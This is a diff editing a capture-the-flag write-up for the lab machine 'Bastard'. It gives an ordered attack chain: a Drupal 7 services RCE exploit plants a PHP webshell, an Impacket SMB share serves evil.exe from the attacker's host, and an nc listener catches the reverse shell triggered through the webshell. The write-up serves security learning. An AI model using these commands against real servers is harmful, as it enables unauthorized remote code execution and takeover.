@@ -98,7 +98,7 @@ So I'm able to modify the exploit accordingly
 
 ![drupal-exploit](/assets/img/bastard/bastard-drupal-exploit.png)
 
-I changed the php payload to a webshell, that's executable from the created page sh1n0bi.php.
+I changed the php payload to a webshell, that would be executable from the created page sh1n0bi.php.
 
 
 
@@ -117,14 +117,17 @@ Rather than upload the evil.exe I can serve it to the target with Impacket's smb
 
 
 
-First we have to run smbserver.py and share the folder containing evil.exe.
+First, run the exploit which creates the webshell.
+`php drupal7-services-module-RCE.php`
+
+Second, we have to run smbserver.py and share the folder containing evil.exe.
 
 `python smbserver.py -comment 'My share' Sh1n0bi /tmp/sh1n/`
 
-Second, set an nc listener...
+Third, set an nc listener...
 `nc -nlvp 443'
 
-Third, execute the evil payload via the created webshell.
+Fourth, execute the evil payload via the created webshell.
 `10.10.10.9/sh1n0bi.php?cmd=\\10.10.14.16\Sh1n0bi\evil.exe`
 
 we get a shell...
